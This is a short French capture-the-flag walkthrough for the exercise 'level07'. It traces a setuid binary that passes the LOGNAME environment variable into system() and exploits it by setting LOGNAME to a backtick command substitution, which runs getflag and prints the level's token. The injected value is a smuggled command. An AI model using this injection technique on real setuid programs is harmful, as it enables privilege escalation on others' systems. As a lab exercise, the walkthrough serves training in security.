ls -la
on trouve un ex level07

quand on le lance il renvoit level07

et quand on fait un ltrace ./level07 on a :
__libc_start_main(0x8048514, 1, 0xbffff7e4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                            = 2007
geteuid()                                                            = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                  = 0
getenv("LOGNAME")                                                    = "level07"
asprintf(0xbffff734, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)  = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                               = 0
+++ exited (status 0) +++

et la ligne qui nous interesse et
getenv("LOGNAME")                                                    = "level07"
on peut voir qu'il prend le env de LOGNAME donc si on le change par getflag
ca devrait etre bon

go try
export LOGNAME=getflag
./level07
on obtient getflag
il doit y avoir une erreur de syntaxe

j'ai trouver il faut mettre 
export LOGNAME=\`getflag\` pour que tous soit bon

on lance ./level07 
et HOP
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h